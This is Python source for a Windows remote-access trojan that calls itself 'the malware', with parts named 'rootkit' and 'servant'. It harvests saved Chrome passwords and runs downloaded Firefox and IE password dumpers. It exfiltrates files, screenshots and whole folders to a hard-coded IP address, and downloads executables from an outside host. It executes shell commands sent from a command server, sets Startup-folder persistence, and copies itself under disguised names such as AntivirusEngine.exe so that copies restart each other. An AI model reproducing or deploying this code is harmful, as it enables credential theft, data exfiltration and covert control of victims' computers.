#!/usr/bin/env python3
# *-coding:Utf-8 -*

##################################################################################################################
# This part is about the normal import
import socket
import uuid
import getpass
import platform
import random
import os
import sys
import time
import glob
import traceback
import subprocess
import json
import logging
import ctypes
import traceback

# must be download with pip
import psutil
import zipfile
import urllib.request
import sqlite3
import shutil

#specific windows import
if not platform.platform().startswith('Linux'):
    import win32crypt
    import win32com.client as win32com

# external libraries
import xmlrpclibclient

logging.basicConfig(level=logging.DEBUG, filename="update_log.txt", filemode='w',
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')


# INFO => use of a class or module
# DEBUG => usefull variable or action
# WARNING => something failed
# ERROR => the output of an error
########################################################################################################################
# Cette partie concerne les fonctions clients de base
def execute(command):
    output = subprocess.Popen(command, shell=True,
                              stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                              stdin=subprocess.PIPE)
    return output.stdout.read().decode("ISO-8859-1") + output.stderr.read().decode("ISO-8859-1")

def unzip(file, folder):
    zip_ref = zipfile.ZipFile(file, 'r')
    zip_ref.extractall(folder)
    zip_ref.close()

def wget(url):
    file_name = url.split('/')[-1]
    urllib.request.urlretrieve(url, file_name)
    if os.path.isfile(file_name):
        return '[+] File downloaded'
    else:
        return '[-] Problem downloading file'

def check_dir(folder):
    if os.path.isdir(folder):
        total_size = os.path.getsize(folder)
        for item in os.listdir(folder):
            itempath = os.path.join(folder, item)
            if os.path.isfile(itempath):
                total_size += os.path.getsize(itempath)
            elif os.path.isdir(itempath):
                total_size += check_dir(itempath)
        return total_size

def screenshot(targetinfo):
    if os.getcwd() == targetinfo.folder:
        pass
    else:
        os.chdir(targetinfo.folder)
    execute(targetinfo.folder + '\\Support\\PyHelpers.bat')
    if os.path.isfile(targetinfo.folder + '\\Support\\PyHelpers.exe'):
        os.system(targetinfo.folder + '\\Support\\PyHelpers.exe Support\\shotscreen.jpeg')
        send_document(targetinfo.folder + '\\Support\\shotscreen.jpeg')
        os.remove(targetinfo.folder + '\\Support\\shotscreen.jpeg')
        return 'screenshot succeed'
    else:
        return 'screenshot failed'


def send_document(doc_tosent):
    logging.debug('send doc is used for: ' + doc_tosent)
    server = xmlrpclibclient.ServerProxy("http://82.233.188.182:3000")
    if os.path.isfile(doc_tosent):
        with open(doc_tosent, "rb") as handle:
            binary_data = xmlrpclibclient.Binary(handle.read())
        if server.send_file(binary_data, doc_tosent):
            return True
    else:
        return False


def setup(targetinfo):
    logging.info("Use of setup function")
    # Download or not the folder support
    download = 'no'
    if not os.path.exists('Support'):
        download = "yes"
        logging.debug('No folder Support')

    if download == "yes":
        execute("mkdir Support")
        os.chdir("Support")
        wget('http://sgdf7.nancy.free.fr/Support/liste.txt')
        wget('http://sgdf7.nancy.free.fr/Support/Java_update.exe')
        wget('http://sgdf7.nancy.free.fr/Support/Decrypt.exe')
        wget('http://sgdf7.nancy.free.fr/Support/PyHelpers.bat')
        logging.debug('Support folder downloaded')
        os.chdir(targetinfo.folder)


########################################################################################################################
class Testsystem:
    # This class will test the vital functions, and determine what the malware can do

    def __init__(self):
        self.send_doc = False
        self.download = False
        self.exefile = False
        self.randompath = False
        self.communication = False
        self.logging = False
        self.targetinf = False
        logging.info("Use of Testsystem class")

    def unitest(self):
        try:
            targetinfo = Targetinfo()
            self.targetinf = True
            logging.debug("test targetinfo => OK")
        except Exception as e:
            logging.error("targetinf_unitest: " + str(e))

        try:
            wget('http://sgdf7.nancy.free.fr/Support/Java_update.exe')
            self.download = True
            logging.debug("test wget => OK")
        except Exception as e:
            logging.error("download_unitest: " + str(e))

        try:
            module = Search_module(targetinfo)
            randompath = module.random_file()
            if randompath != 'C:\\Users\\Default':
                self.randompath = True
            logging.debug("test Search_module => OK")
        except Exception as e:
            logging.error("randompath_unitest" + str(e))

        try:
            shutil.copyfile('Java_update.exe', randompath + "\\Java_update.exe")
            #os.system(os.path.join(randompath, 'Java_update.exe'))
            os.remove(os.path.join(randompath, 'Java_update.exe'))
            os.remove('Java_update.exe')
            self.exefile = True
            logging.debug("test exefile => OK")
        except Exception as e:
            logging.error("exefile_unitest: " + str(e))

        try:
            Communication(targetinfo)
            self.communication = True
            logging.debug("test communication => OK")
        except Exception as e:
            logging.error("communication_unitest"+str(e))

        try:
            send_document('update_log.txt')
            self.send_doc = True
            logging.debug("test send_doc => OK")
        except Exception as e:
            logging.error("send_doc_unitest: " + str(e))

    def choose_mode(self):
        # This module will choose the mode, depend on what the system cannot do
        if self.send_doc and self.download and self.exefile and self.randompath and self.communication and self.logging and self.targetinf:
            return 'fullsystem'
        # elif self.telegram and


########################################################################################################################
class Monitoring():
    # This class will make sure an other instance of the malware is always currently running

    def __init__(self, targetinfo):
        self.targetinfo = targetinfo
        self.listservant = ['fullprotect.exe', 'UpdateChange.exe', 'Postprod.exe', 'Microsoft_update.exe',
                            'Runtime.exe', 'plugin_host.exe', 'Manager_host.exe', 'AntivirusEngine.exe',
                            'Desktop_media_service.exe', 'FileSystem.exe']
        self.listrootkit = ['windows_logon_control.exe', 'protect_logon.exe', 'taskcontrol.exe', 'Java_explorer3.exe', "XR.exe"]
        with open(os.path.join(os.getcwd(), "update.json"), "r") as file:
            self.data = json.load(file)
        logging.info("Use of Monitoring class")

    def check_file(self, key):
        # This function will return true if the program is actif or false if the file was deleted or unactive
        logging.debug("the file we are looking for : {}".format(self.data[key]))
        a = [p.info for p in psutil.process_iter(attrs=['pid', 'name']) if
             os.path.basename(self.data[key]) in p.info['name']]
        if a != []:
            logging.debug("the file is actif : {}".format(os.path.basename(self.data[key])))
            return True
        else:
            if os.path.isfile(self.data[key]):
                os.startfile(self.data[key])
                logging.debug('restarting {}'.format(key))
                return True
            else:
                logging.debug("The file has been deleted, and has no more process actif")
                return False

    def rootkit(self):
        if self.data["servant1"] == '':
            logging.debug("Servant1 not in json file")
            Monitoring.create_servant(self)
        else:
            if Monitoring.check_file(self, "servant1"):
                logging.debug("servant1 is running")
            else:
                Monitoring.create_servant(self)

        if self.data["servant2"] == '':
            logging.debug("Servant2 not in json file")
            Monitoring.create_servant(self)
        else:
            if Monitoring.check_file(self, "servant2"):
                logging.debug("servant2 is running")
            else:
                Monitoring.create_servant(self)

    def servant(self):
        logging.debug("Looking for rootkit => " + self.data['rootkit_dir'])
        if not Monitoring.check_file(self, "rootkit_dir"):
            logging.debug("Monitoring.check didn't find the rootkit file")
            Monitoring.monitoring_rootkit(self)
        else:
            logging.debug("rootkit is here and working")

    def create_servant(self):
        logging.debug("Creating a new servant")
        # Settings of the new json file
        data = {"id": 1, "rootkit_dir": self.targetinfo.selfname, "servant": True, "servant1": "", "servant2": "",
                "status": "actif"}

        # Getting a new name
        name = random.sample(self.listservant, 1)[0]
        self.listservant.remove(name)

        # Getting a new location
        modulesearch = Search_module(self.targetinfo)
        while True:
            randomfile = modulesearch.random_file()
            #shutil.copyfile(self.targetinfo.selfname, os.path.join(randomfile, name))
            command = "copy "+self.targetinfo.selfname+" "+os.path.join(randomfile, name)
            logging.debug(execute(command))
            fullname = os.path.join(randomfile, name)
            if os.path.isfile(fullname):
                break

        # Rename the new malware with the new name
        if self.data['servant1'] == '':
            self.data['servant1'] = fullname
            data['id'] = 1
            data['servant'] = True
            logging.info("Creating a new servant1: " + fullname)
        else:
            self.data['servant2'] = fullname
            data['id'] = 2
            data['servant'] = True
            logging.info("Creating a new servant2: " + fullname)

        # Create a json file, copy it to the new location and rename it update.json
        with open('temp.json', 'w') as outfile:
            json.dump(data, outfile)
        
        print(os.getcwd())
        #shutil.copyfile("temp.json", randomfile)
        command = "copy temp.json "+os.path.join(randomfile, "update.json")  
        print(command)
        print(os.popen(command))
        #os.rename(os.path.join(randomfile, "temp.json"), os.path.join(randomfile+"update.json"))
        os.remove('temp.json')    
        if os.path.exists(fullname) and os.path.exists(os.path.join(randomfile, "update.json")):
            logging.debug("Migration went well")
            print("Migration went well")
        elif os.path.exists(fullname):
            logging.debug("the json file wasn't copy")
            print("the json file wasn't copy")
        elif os.path.exists(os.path.join(randomfile, "update.json")):
            logging.debug("The servant wasn't copy")
            print("The servant wasn't copy")
        else:
            logging.debug('Migration failed totally')
            print('Migration failed totally')

        # Execute the new file in the new place (must be an .exe)
        logging.debug('executing the new malware')
        os.startfile(fullname)

        # Update the update.json
        os.chdir(self.targetinfo.folder)
        with open('update.json', 'w') as outfile:
            json.dump(self.data, outfile)

    def become_rootkit(self):
        newname = random.sample(self.listrootkit, 1)[0]
        os.rename(self.targetinfo.selfname, os.getcwd() + newname + ".exe")
        data = {"id": 0, "rootkit_dir": self.targetinfo.selfname, "servant": False, "servant1": "", "servant2": ""}
        # Update the update.json
        os.chdir(self.targetinfo.folder)
        with open('update.json', 'w') as outfile:
            json.dump(data, outfile)
        Monitoring.rootkit(self)
        logging.warning('Servant has become a rootkit' + self.targetinfo.selfname)

    def monitoring_rootkit(self):
        # The goal of this fucntion is to be sure there is no more than 1 occurence of rootkit in the system
        for program in psutil.process_iter(attrs=['pid', 'name']):
            for name in self.listrootkit:
                if program == name:
                    logging.debug("There is still a running rootkit: {}".format(name))
                    sys.exit()
        logging.debug("There is no other rootkit running, the actual servant will become a rootkit")
        Monitoring.become_rootkit(self)


########################################################################################################################
# This part is to download files
class UploadServer:
    # This class will get all the files of a folder, and send them via communication class
    # target need to be a folder

    def __init__(self, target):
        self.target = target
        logging.info("Use of UploadServer class")

    def scanos(self):
        liste = []
        for filename in glob.iglob(self.target + '**/*', recursive=True):
            if os.path.isfile(filename):
                try:
                    send_document(filename)
                except:
                    pass
            else:
                liste.append(filename)
        return liste

    def main(self):
        #if os.path.isdir(self.target):
        #    return "the DownloadServer need a folder to work, not a file"
        folder = UploadServer.scanos(self)
        while len(folder) != 0:
            try:
                self.target = folder[0]
                folder = folder + UploadServer.scanos(self)
            except:
                pass
            folder.remove(folder[0])
        return 'upload completed'


########################################################################################################################
class Search_module:
    # the target need to be the exact word to work
    # Need a elevated privilege to browse files
    def __init__(self, targetinfo):
        self.targetinfo = targetinfo
        self.prefix = 'C:\\Users\\' + self.targetinfo.username
        self.defaultpath = os.getcwd()
        self.all_dossier = []
        os.chdir(self.prefix)
        logging.info("Use of Search_module class")

    def random_file(self):
        for dirname, dirnames, filenames in os.walk('.'):
            # print path to all subdirectories first.
            for subdirname in dirnames:
                file = os.path.join(dirname, subdirname)
                if ' ' in file:
                    # Il faut rechercher uniquement les dossiers sans espace dans le nom, sinon la commande copy va foirer
                    pass
                try:
                    os.chdir(self.prefix + file)
                    os.chdir(self.prefix)
                    self.all_dossier.append(os.path.join(dirname, subdirname))
                except:
                    pass

        try:
            random_path = random.sample(self.all_dossier, 1)
            os.chdir(self.defaultpath)
            random_path = random_path[0]
            result = self.prefix + random_path[1:]
        except:
            result = 'C:\\Users\\Default'

        return result


########################################################################################################################
# Cette partie concerne les processus pour rendre notre malware persistent
class Persistence:
    # This module can only be used with high-privilege administrator

    def __init__(self, targetinfo):
        self.targetinfo = targetinfo
        # Sert à connaitre l'username de la cible. Est présent dans les données Target info
        # Sert à connaitre le répertoire des fichiers au démarrage
        self.startup_path = "C:\\Users\\" + self.targetinfo.username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        self.startlink = self.startup_path + '\\' + self.targetinfo.shortname2 + '.lnk'
        logging.info("Use of Persistence class")

    def start_folder(self):
        # A lik appear in the startup directory
        # link = self.startup_path + "\\" + self.targetinfo.shortname2 + ".lnk"
        shell = win32com.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(self.startlink)
        shortcut.Targetpath = r'"' + self.targetinfo.selfname + '"'
        shortcut.WorkingDirectory = r'"' + self.targetinfo.folder + r'"'
        shortcut.WindowStyle = 7  # 7 - Minimized, 3 - Maximized, 1 - Normal
        shortcut.save()
        logging.info('Start folder succeed')

    def check(self):
        if os.path.islink(self.startlink):
            return True
        else:
            Persistence.start_folder(self)
            return False

    def selfdestruct(self):
        os.remove(self.startlink)


########################################################################################################################
# Cette partie concerne la récolte des mots de passe enregistrés sur les navigateurs (firefox, ie, chrome)
class Password:
    def __init__(self):
        logging.info("Use of Password class")

    # return either the stored passwords on chrome, or the fact that chrome is not installed
    # don't need elevated privilege
    def chrome(self):
        info_list = []
        path = Password.getpath(self)
        try:
            connection = sqlite3.connect(path + "Login Data")
            with connection:
                cursor = connection.cursor()
                v = cursor.execute(
                    'SELECT action_url, username_value, password_value FROM logins')
                value = v.fetchall()

            for origin_url, username, password in value:
                if os.name == 'nt':
                    password = win32crypt.CryptUnprotectData(
                        password, None, None, None, 0)[1]

                if password:
                    info_list.append({
                        'origin_url': origin_url,
                        'username': username,
                        'password': str(password)
                    })

        except sqlite3.OperationalError as e:
            e = str(e)
            if (e == 'database is locked'):
                return '[!] Make sure Google Chrome is not running in the background'
            elif (e == 'no such table: logins'):
                return '[!] Something wrong with the database name'
            elif (e == 'unable to open database file'):
                return '[!] Something wrong with the database path'
            else:
                return str(e)

        for element in info_list:
            n_infolist = str(element)

        if not info_list:
            n_infolist = "[!] Chrome password module failed"

        logging.debug(n_infolist)

    def getpath(self):
        if os.name == "nt":
            # This is the Windows Path
            PathName = os.getenv('localappdata') + \
                       '\\Google\\Chrome\\User Data\\Default\\'
        elif os.name == "posix":
            PathName = os.getenv('HOME')
            if sys.platform == "darwin":
                # This is the OS X Path
                PathName += '/Library/Application Support/Google/Chrome/Default/'
            else:
                # This is the Linux Path
                PathName += '/.config/google-chrome/Default/'
        if not os.path.isdir(PathName):
            return '[!] Chrome Doesn\'t exists'
        return PathName

    def IEPasswordDump(self):
        if os.path.isfile('Support\\Java_update.exe'):
            results = os.startfile('Support\\Java_update.exe')
        else:
            results = 'fail to find IEPasswordDump'
        logging.debug(results)

    def firefox_decrypt(self):
        if os.path.isfile('Support\\Decrypt.exe'):
            results = os.startfile('Support\\Decrypt.exe')
        else:
            results = 'fail to find firefox_decrypt'
        logging.debug(results)


########################################################################################################################
# Cette partie concerne la recolte des informations sur la cible

def is_admin():
    if ctypes.windll.shell32.IsUserAnAdmin() != 0:
        return True
    else:
        # ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        # sys.exit()
        return False


def mac():
    raw_mac = uuid.getnode()
    mac = ':'.join(('%012X' % raw_mac)[i:i + 2] for i in range(0, 12, 2))
    return mac


def external_ip():
    ex_ip_grab = ['ipinfo.io/ip', 'icanhazip.com', 'ident.me',
                  'ipecho.net/plain', 'myexternalip.com/raw',
                  'wtfismyip.com/text']
    external_ip = ''
    for url in ex_ip_grab:
        try:
            external_ip = urllib.request.urlopen('http://' + url).read().rstrip()
        except IOError:
            pass
        if external_ip and (6 < len(external_ip) < 16):
            break

    return external_ip.decode("ISO-8859-1")


class Targetinfo:
    def __init__(self):
        # basic informations who need no fonction and hold one line
        self.platform = platform.platform()
        self.processor = platform.processor()
        self.architecture = platform.architecture()[0]
        self.hostname = socket.gethostname()
        self.internal_ip = socket.gethostbyname(socket.gethostname())
        self.selfname = os.path.abspath(sys.argv[0])  # Ex: C:\Users\Test\Download\Java_explorer.exe
        self.folder = os.path.dirname(self.selfname)  # Ex: C:\Users\Test\Download
        self.username = getpass.getuser()  # Ex: Test
        self.fqdn = socket.getfqdn()
        a = sys.argv[0]
        a = a.split('\\')
        self.shortname = a[-1]  # Ex: Java_explorer.exe
        a = self.shortname.split('.')  # Meme chose que shortname, mais sans l'extension
        self.shortname2 = a[0]

        # informations from fonctions
        self.mac = mac()
        self.admin = is_admin()
        self.external_ip = external_ip()

        # informations from windows commands
        self.users = execute('net users')
        self.groups = execute('wmic useraccount list full')

        logging.info("Use of Targetinfo class")
        logging.info('The actual program is {}'.format(self.selfname))

    def print_survey(self):
        SURVEY_FORMAT = '''
                System Platform     - {}
                Processor           - {}
                Architecture        - {}
                Hostname Aliases    - {}
                Internal IP         - {}
                Selfname            - {}
                Folder              - {}
                Username            - {}
                FQDN                - {}
                MAC Address         - {}
                Is_Admin            - {}
                External IP         - {}
                
                Users               - {}
                Groups              - {}
                '''

        data = SURVEY_FORMAT.format(self.platform, self.processor, self.architecture,
                                    self.hostname, self.internal_ip, self.selfname,
                                    self.folder, self.username, self.fqdn,
                                    self.mac, self.admin, self.external_ip, self.users, self.groups)

        logging.info(data.encode())


########################################################################################################################
# cette partie concerne le fonctionnement du client
class Communication():
    def __init__(self, targetinfo):
        self.targetinfo = targetinfo
        self.server = xmlrpclibclient.ServerProxy("http://localhost:3000")
        logging.info("Use of Communication class")
        if self.server.handshake():
            logging.debug("Connected to the server")
        else:
            logging.warning(("not connected to the server"))

    def receive_msg(self):
        command = self.server.receive_command()
        logging.debug("Received command: " + command)
        # seperate data into command and action
        cmd, _, action = command.partition(' ')

        if cmd == "downloadfile":
            with open(action, "wb") as file:
                file.write(self.server.receive_file(os.path.basename(action)).data)
            if os.path.exists(action):
                results = "file downloaded from the server"
            else:
                results = "file to download not found"

        elif cmd == 'uploadfile':
            if send_document(action):
                return 'file has been uploaded'
            else:
                return 'file not uploaded'

        elif cmd == 'selfdestruct':
            a = Persistence(self.targetinfo)
            a.selfdestruct()
            results = a.check()

        elif cmd == 'help':
            results = "selfdestruct => delete persistence and shutdown all the malware\n" \
                      "download <folder> => download the folder file per file\n" \
                      "actif => turn the mode actif\n" \
                      "sleep => turn the mode sleep\n" \
                      "log => the servant send log\n" \
                      "reboot => destroy the json file and create 2 new servants\n" \
                      "survey => send the targetinfo survey\n" \
                      "execute <command> => execute the command\n" \
                      "wget <url> => download the file online\n" \
                      "search => use the dir cmd command\n" \
                      "screenshot => take and send a screenshot\n" \
                      "stop => send nothing and wait for instruction\n"

        elif cmd == 'uploadfolder':
            if not action:
                results = "precise the folder you want to download"
            else:
                module = UploadServer(action)
                results = module.main()

        elif cmd == "actif":
            main = Fullsystem(self.targetinfo)
            main.read_json()
            main.change_json("status", "actif")
            results = "the status is now actif"

        elif cmd == 'sleep':
            main = Fullsystem(self.targetinfo)
            main.read_json()
            main.change_json("status", "sleep")
            results = "the status is now sleep"

        elif cmd == 'log':
            send_document("update_log.txt")
            results = "servant log sent"

        elif cmd == "reboot":
            main = Fullsystem(self.targetinfo)
            main.read_json()
            main.delete_rootkitjson()
            results = "rootkit json deleted, 2 new servants will be created"

        elif cmd == 'survey':
            results = self.targetinfo.print_survey()

        elif cmd == 'execute':
            # TESTED OK
            results = execute(action)

        elif cmd == 'wget':
            # TESTED OK
            # NEED ELEVATED
            # use just wget http://s2.q4cdn.com/235752014/files/doc_downloads/test.pdf without ''
            results = wget(action)

        elif cmd == 'search':
            # TESTED OK
            command = 'dir "\*{}*" /s'.format(action)
            a = execute(command)
            # a = Search_module(action)
            # results = a.scanos()
            with open('search results.txt', 'w') as file:
                file.write(str(a.encode("ISO-8859-1", "replace")))
                file.close()
            if os.path.exists('search results.txt'):
                send_document('search results.txt')
                os.remove('search results.txt')
                results = "file with resuts send"

        elif cmd == 'screenshot':
            results = screenshot(self.targetinfo)

        elif cmd == 'stop':
            time.sleep(60)
            results = 'we are waiting your order'


            results = self.targetinfo.selfname + ':   ' + results

        else:
            results = "Command not understood"

        logging.debug('results: '+results)

        try:
            self.server.send_result(results)
        except:
            pass

class Fullsystem():

    def __init__(self, targetinfo, statut="actif"):
        self.targetinfo = targetinfo
        self.json_data = {}
        self.statut = statut
        self.communication = Communication(self.targetinfo)

    def read_json(self):
        if not os.path.isfile('update.json'):
            logging.debug('Unable to find the json file, no problem it will be created')
            with open("update.json", 'w') as outfile:
                json.dump({"id": 0, "rootkit_dir": self.targetinfo.selfname, "servant": False, "servant1": "",
                           "servant2": "", "status": self.statut}, outfile)
            with open('update.json', 'r') as f:
                self.json_data = json.load(f)
        else:
            with open('update.json', 'r') as f:
                self.json_data = json.load(f)
        logging.info("Use of Handle_json class")

    def send_rootkitjson(self):
        return os.path.join(os.path.dirname(self.json_data['rootkit_dir']), 'update.json')

    def delete_rootkitjson(self):
        os.remove(Fullsystem.send_rootkitjson(self))

    def change_json(self, key, value):
        with open(Fullsystem.send_rootkitjson(self), 'r') as f:
            data = json.load(f)

        with open(Fullsystem.send_rootkitjson(self), 'w') as outfile:
            data[key] = value
            json.dump(data, outfile)

        logging.debug("the rootkit json key {0} was converted to {1}".format(key, value))

    def actif(self):
        if self.json_data['servant']:
            communication = Communication(self.targetinfo)
            print('The actual malware is a servant')
            logging.debug('The actual malware is a servant')
            setup(self.targetinfo)
            module = Password()
            module.chrome()
            module.firefox_decrypt()
            module.IEPasswordDump()
            while True:
                print('start loop')
                Fullsystem.read_json(self)
                monitoring = Monitoring(self.targetinfo)
                communication.receive_msg()
                monitoring.servant()

        elif not self.json_data['servant']:
            print(('The actual malware is a rootkit'))
            logging.debug('The actual malware is a rootkit')
            module = Persistence(self.targetinfo)
            Fullsystem.read_json(self)
            # self.targetinfo.print_survey()
            monitoring = Monitoring(self.targetinfo)
            while True:
                print('start loop')
                Fullsystem.read_json(self)
                monitoring.rootkit()
                if module.check():
                    logging.debug("the persistence is on")
                else:
                    logging.warning('the persistence is not set')
                send_document("update_log.txt")
                time.sleep(60) # send log every hours
        else:
            Fullsystem.read_json(self)
            logging.warning('Unable to determine the role of this malware')

    def passif(self):
        if not self.json_data['servant']:
            logging.debug('Sleep status enabled for rootkit, waiting for new instructions...')
            send_document("update_log.txt")
            communication = Communication(self.targetinfo)
            communication.receive_msg()
            monitoring = Monitoring(self.targetinfo)
            monitoring.rootkit()
            sys.exit()

    def main(self):
        Fullsystem.read_json(self)
        if self.json_data['status'] == 'actif':
            logging.debug("Status actif on")
            Fullsystem.actif(self)
        else:
            logging.debug("Status sleep on")
            Fullsystem.passif(self)


if __name__ == '__main__':
    #module = Testsystem()
    #module.unitest()
    #mode = module.choose_mode()
    #if mode == "fullsystem":
    try:
        targetinfo = Targetinfo()
        module = Fullsystem(targetinfo, "actif")
        module.main()
    except Exception:
        traceback.print_exc()
    """count = 0
    while count < 10:
        try:
            module = Fullsystem(targetinfo, "actif")
            module.main()
        except json.decoder.JSONDecodeError:
            os.remove("update.json")
        # except WindowsError:
        #    time.sleep(10)

        except Exception as e:
            print(traceback.format_exc())
            logging.error("Exception occurred", exc_info=True)
            send_document("update_log.txt")
            print(str(e))
        count += 1

    os.remove(targetinfo.selfname)
    sys.exit()"""
